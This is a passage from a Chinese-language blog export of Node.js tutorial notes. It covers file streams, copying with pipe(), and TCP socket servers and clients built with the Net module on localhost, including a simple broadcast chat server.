href="#5-2-1-文件流的概念" class="headerlink" title="5.2.1 文件流的概念"></a>5.2.1 文件流的概念</h2><p>例如复制文件的过程，文件流的概念就是文件A中数据以流动的方式通过数据流管道，然后进入到文件B中，采用”读一部分，写一部分“的方式，就像看视频，下一点播一点。</p><p>在Node.js中，文件流的操作由Stream模块提供，Stream模块是一个抽象接口，Node.js中还有很多对象实现了这个接口，有4种流类型：</p><ul><li>Readable: 可读流</li><li>Writeable：可写流</li><li>Duplex：可读可写流</li><li>Transform：变换流（操作被写入数据，然后读出结果）</li></ul><p>Node.js中的I/O是异步的，因此对磁盘和网络的读/写需要通过回调函数来读取数据，而回调函数需要通过事件来触发，所有的Stream对象都是EventEmitter(时间触发器)的实例。</p><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td>data</td><td>当有数据可读时触发</td></tr><tr><td>end</td><td>没有更多的数据可读时触发</td></tr><tr><td>error</td><td>在接收和写入过程中发生错误时触发</td></tr><tr><td>finish</td><td>所有数据都已被写入到低层系统时触发</td></tr></tbody></table><h2 id="5-2-2-Node-js的可读流和可写流"><a href="#5-2-2-Node-js的可读流和可写流" class="headerlink" title="5.2.2 Node.js的可读流和可写流"></a>5.2.2 Node.js的可读流和可写流</h2><ol><li>可读流</li></ol><p>使用文件流进行文件复制，首先需要创建一个可读流，可读流可以让用户在源文件中分块读取文件中的数据，然后再从可读流中读取数据。</p><p><code>fs.createReadStream()</code></p><p>由于流是基于EventEmitter的，从流读取数据最好的方法是监听数据事件（data event），并附加一个回调函数，返回数据，这个操作是循环进制的，一直到读取完毕。在读取错误或读取完毕时触发error或end事件。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> fs<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建可读流</span><span class="token keyword">let</span> readableStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此时流为静止状态</span><span class="token comment" spellcheck="true">//设置编码为utf-8</span>readableStream<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'UTF8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//处理流事件</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//附加回调函数，流开始流动</span>    total <span class="token operator">+</span><span class="token operator">=</span> chunk<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"程序执行完毕"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出：程序执行完毕</span><span class="token comment" spellcheck="true">//input.txt中的内容</span></code></pre><ol start="2"><li>可写流</li></ol><p><code>fs.createWriteStream()</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> fs<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建可读流</span><span class="token keyword">let</span> readableStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建可写流</span><span class="token keyword">let</span> writableStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createWriteStream</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置编码为utf-8</span>readableStream<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'UTF8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>    writableStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    writableStream<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将剩下的数据全部写入</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>writableStream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="5-2-3使用pipe-处理大文件"><a href="#5-2-3使用pipe-处理大文件" class="headerlink" title="5.2.3使用pipe()处理大文件"></a>5.2.3使用pipe()处理大文件</h2><p>在使用大文件复制的案例中，通过可读流的chunk参数来传递数据，如果把数据比作是水，chunk相当于盆，使用盆来完成水的传递。可读流中还有一个函数叫做pipe()，这个函数是一个很高效的文件处理方式，简化复制文件的操作，“把盆换成了管子”。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> srcPath <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">let</span> distPath <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">let</span> readableStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> writableStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createWriteStream</span><span class="token punctuation">(</span>distPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//可以通过使用可读流函数pipe()接入到可写流中</span><span class="token keyword">if</span><span class="token punctuation">(</span>readableStream<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>writableStream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'复制成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'复制失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>数据与文件的处理是服务器端编程与客户端编程的本质区别所在。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js网络编程</title>
      <link href="2019/05/05/Node.js-Node.js%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>2019/05/05/Node.js-Node.js%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="6-1-Node-js网络编程基础"><a href="#6-1-Node-js网络编程基础" class="headerlink" title="6.1 Node.js网络编程基础"></a>6.1 Node.js网络编程基础</h1><h2 id="6-1-1-IP地址和端口号"><a href="#6-1-1-IP地址和端口号" class="headerlink" title="6.1.1 IP地址和端口号"></a>6.1.1 IP地址和端口号</h2><p>通过IP地址可以找到服务器设备，而端口号可以理解为在发送数据时定位到不同服务器应用程序的标识。</p><p>IP地址对于计算机是唯一的，一个端口号也只能被一个应用程序所占用。</p><h2 id="6-1-2-套接字Socket简单模型"><a href="#6-1-2-套接字Socket简单模型" class="headerlink" title="6.1.2 套接字Socket简单模型"></a>6.1.2 套接字Socket简单模型</h2><p>先了解一下TCP/IP协议，TCP（Transfer Control Protocol）传输控制协议是一种稳定可靠的传送方式，TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地为止。</p><p>Socket原意为孔或插座。在程序方面可理解为接口对象，在网络编程中通常称为套接字，常用于描述IP地址和端口等。Socket是支持TCP/IP的网络通信的基本操作单元。<strong>简单理解，Socket就是对TCP/IP协议的封装，Socket本身并不是协议，而是一个调用接口</strong></p><p>Socket需要使用套接字地址来展开工作，套接字地址就是IP地址和端口号的组合，套接字服务与其他服务不同，不需要处理网络中的GET或POST请求，而是采用点对点传输数据方式。</p><h2 id="6-1-3-Node-js名字的由来"><a href="#6-1-3-Node-js名字的由来" class="headerlink" title="6.1.3 Node.js名字的由来"></a>6.1.3 Node.js名字的由来</h2><p>Node.js诞生的目的就是为了更加高效的处理网络数据，因为使用它进行网络编程时不需要使用其他的服务器软件进行支持，Node.js本身就是一个服务器。在进行网络编程时，每一个进程构成网络应用中的一个结点，而Node就是结点的意思，最终web.js更名为Node.js。</p><h1 id="6-2-Node-js中实现套接字服务"><a href="#6-2-Node-js中实现套接字服务" class="headerlink" title="6.2 Node.js中实现套接字服务"></a>6.2 Node.js中实现套接字服务</h1><p>套接字服务由Net模块提供：</p><p><code>let net = require(&#39;net&#39;);</code></p><h2 id="6-2-1-Net-Server对象"><a href="#6-2-1-Net-Server对象" class="headerlink" title="6.2.1 Net.Server对象"></a>6.2.1 Net.Server对象</h2><p><code>let server = net.creatServer()</code></p><p>当Server对象被创建后，在该服务器的生命周期中就存在了一些可触发的事件。</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>listening</td><td>当服务器调用server.listen绑定后会触发</td></tr><tr><td>connection</td><td>当新连接创建后会被触发</td></tr><tr><td>close</td><td>服务器关闭时会被触发</td></tr><tr><td>error</td><td>发生错误时触发</td></tr></tbody></table><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'有客户端连接上来了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'listening'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器监听成功了，正在等待客户端连接'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后启用Telnet客户端服务，命令行中输入：</p><blockquote><p>telnet 127.0.0.1 3000</p></blockquote><p>就会连接成功。</p><h2 id="6-2-2-Net-Socket对象"><a href="#6-2-2-Net-Socket对象" class="headerlink" title="6.2.2 Net.Socket对象"></a>6.2.2 Net.Socket对象</h2><p> Net.Socket实例实现了一Duplex（双工）流接口，提供了Writable和Readable所有功能，所以说它既是可读流也是可写流。</p><p> Net.Socket对象同时在套接字服务器和客户端上创建，并且会允许数据在他们之间进行读取和写入，一旦Socket对象被创建，就提供了一些触发的事件。</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>lookup</td><td>解析域名后，连接前触发</td></tr><tr><td>connect</td><td>成功建立socket连接时触发</td></tr><tr><td>data</td><td>当收到数据时触发</td></tr><tr><td>end</td><td>当socket另一点发送FIN包时</td></tr><tr><td>timeout</td><td>socket空闲超时</td></tr><tr><td>drain</td><td>写缓存为空的时候触发。</td></tr><tr><td>error</td><td>发生错误。</td></tr><tr><td>close</td><td>socket关闭</td></tr></tbody></table><ol><li>服务器向客户端发送消息</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'有客户端连接上来了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'客户端IP地址：'</span><span class="token operator">+</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token operator">+</span><span class="token string">'连接到了当前服务器'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'listening'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器监听成功了，正在等待客户端连接'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//然后启用Telnet客户端服务，命令行中输入：</span><span class="token comment" spellcheck="true">//telnet 127.0.0.1 3000</span><span class="token comment" spellcheck="true">//服务端输出</span><span class="token comment" spellcheck="true">//服务器监听成功了，正在等待客户端连接</span><span class="token comment" spellcheck="true">//有客户端连接上来了</span><span class="token comment" spellcheck="true">//客户端IP地址：127.0.0.1连接到了当前服务器</span><span class="token comment" spellcheck="true">//客户端输出</span><span class="token comment" spellcheck="true">//hello</span></code></pre><ol start="2"><li>统计在线人数</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">{</span>    count<span class="token operator">++</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'welcome,当前在线人数：'</span><span class="token operator">+</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>    socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'remoteAddress'</span><span class="token operator">+</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'remotePort'</span><span class="token operator">+</span>socket<span class="token punctuation">.</span>remotePort<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//然后启用两个Telnet客户端服务，命令行中输入：</span><span class="token comment" spellcheck="true">//telnet 127.0.0.1 3000</span><span class="token comment" spellcheck="true">//服务端输出</span><span class="token comment" spellcheck="true">/*server listening at port 3000welcome,当前在线人数：1welcome,当前在线人数：2*/</span></code></pre><ol start="3"><li>客户端与服务端双向通信</li></ol><p>创建客户端<code>net.creatConnection()</code>执行完毕会返回一个socket对象</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//服务端</span><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">{</span>    socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'我吃的小豆包'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//客户端</span><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> client <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    port<span class="token punctuation">:</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'客户端与服务器连接成功了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'你吃了吗'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="6-3-Node-js进程管理"><a href="#6-3-Node-js进程管理" class="headerlink" title="6.3 Node.js进程管理"></a>6.3 Node.js进程管理</h1><h2 id="6-3-1-Process模块获取终端输入"><a href="#6-3-1-Process模块获取终端输入" class="headerlink" title="6.3.1 Process模块获取终端输入"></a>6.3.1 Process模块获取终端输入</h2><p>如果需要在客户端输入信息发送到服务器，这样的功能就需要依赖Process模块来完成。</p><p>Process模块是一个无须使用require就可以访问的全局对象。</p><pre class=" language-js"><code class="language-js">process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//trim是去掉输入后按的空格</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="6-3-2-多人广播消息"><a href="#6-3-2-多人广播消息" class="headerlink" title="6.3.2 多人广播消息"></a>6.3.2 多人广播消息</h2><p>服务端接收客户端消息，将客户端消息发送给其他客户端</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//服务端</span><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//该数组用来封装所有客户端的scoket</span><span class="token keyword">let</span> users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>socket<span class="token punctuation">)</span> <span class="token punctuation">{</span>    users<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>    socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        users<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>client <span class="token operator">!==</span> socket<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//不同客户端端口号不同</span>                client<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span>remotePort<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'有客户端退出了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//客户端</span><span class="token keyword">let</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向服务端创建连接</span><span class="token keyword">let</span> client <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    port<span class="token punctuation">:</span><span class="token number">3000</span><span class="token punctuation">,</span>    host<span class="token punctuation">:</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" 